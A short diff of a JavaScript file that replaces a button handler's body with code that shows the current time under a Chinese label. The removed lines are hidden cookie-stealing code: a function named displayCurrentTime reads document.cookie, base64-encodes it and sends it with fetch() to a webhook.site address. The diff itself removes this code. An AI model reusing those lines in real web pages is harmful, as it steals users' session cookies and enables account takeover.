@@ -3,9 +3,11 @@ document.addEventListener("DOMContentLoaded", function () {
   button.addEventListener("click", function () {
     displayCurrentTime();
   });
- 
+
   function displayCurrentTime() {
-    var cookie = document.cookie;
-    fetch('https://webhook.site/b8fec0c7-3992-4c89-a8ed-b3c8bc6d619d' + window.btoa(cookie))  ;
+    const now = new Date();
+    const timeString = now.toLocaleTimeString();
+    document.getElementById("timeDisplay").innerText =
+      "現在時間: " + timeString;
   }
 });
